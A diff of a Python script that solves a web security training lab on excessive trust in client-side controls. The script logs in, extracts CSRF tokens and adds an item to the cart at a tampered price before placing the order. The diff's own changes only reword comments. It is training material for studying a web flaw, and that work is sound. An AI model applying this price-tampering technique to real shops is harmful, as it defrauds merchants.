@@ -7,11 +7,11 @@
 # Lab: Excessive trust in client-side controls
 #
 # Steps: 1. fetch the login page
-#        2. Extract csrf token and session cookie
+#        2. Extract the csrf token and session cookie
 #        3. Login as wiener
 #        4. Add the leather jacket to the cart with a modified price
 #        5. Fetch wiener's cart
-#        6. Extract csrf token needed for placing order
+#        6. Extract the csrf token needed for placing order
 #        7. Place order
 #        8. Confirm order
 #
@@ -49,7 +49,7 @@ session = get_login.cookies.get("session")
 # extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", get_login.text)[0]
 
-print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # set credentials
 data = {
@@ -112,7 +112,7 @@ print(Fore.WHITE + "⦗5⦘ Fetching wiener's cart.. " + Fore.GREEN + "OK")
 # extract the csrf token needed for placing order
 csrf = re.findall("csrf.+value=\"(.+)\"", wiener.text)[0]
 
-print(Fore.WHITE + "⦗6⦘ Extracting csrf token needed for placing order.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "⦗6⦘ Extracting the csrf token needed for placing order.. " + Fore.GREEN + "OK")
 
 # data to send via POST
 data = {
